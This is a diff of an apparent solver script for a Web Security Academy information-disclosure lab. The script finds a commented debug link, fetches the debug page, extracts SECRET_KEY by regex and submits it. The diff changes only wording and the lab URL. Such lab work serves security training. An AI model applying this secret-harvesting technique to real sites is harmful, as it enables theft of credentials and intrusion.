@@ -9,7 +9,7 @@
 # Steps: 1. Check the source code of a product page
 #        2. GET the href of the commented a tag named "Debug"
 #        3. Extract the secret key
-#        4. submit the answer
+#        4. submit solution
 #
 #################################################################
 
@@ -21,7 +21,7 @@ import re
 from colorama import Fore
 
 # change this url to your lab
-url = "https://0a5b004603cddab7802d2110003f002e.web-security-academy.net"
+url = "https://0ae700fb032623468425487000c70042.web-security-academy.net"
 
 try:
     inject_payload = requests.get(
@@ -41,21 +41,21 @@ try:
                     "SECRET_KEY.*class=\"v\">(.*) <", debug_page.text)[0]  # extract the secret key
                 print(Fore.WHITE + "4. Extracting the secret key.. " +
                       Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + secret_key)
-            try:  # try to submit the answer
+            try:  # try to submit solution
                 data = {
                     "answer": secret_key
                 }
                 submit_answer = requests.post(
-                    f"{url}/submitsolution", data)  # submit the answer
+                    f"{url}/submitsolution", data)  # submit solution
                 if submit_answer.status_code == 200:
-                    print(Fore.WHITE + "5. Submitting the answer.. " +
+                    print(Fore.WHITE + "5. Submitting solution.. " +
                           Fore.GREEN + "OK")
                     print(
                         Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
 
             except:
                 print(
-                    Fore.RED + "[!] Failed to submit the answer through exception")
+                    Fore.RED + "[!] Failed to submit solution through exception")
         except:
             print(
                 Fore.RED + "[!] Failed to get the debug page through exception")
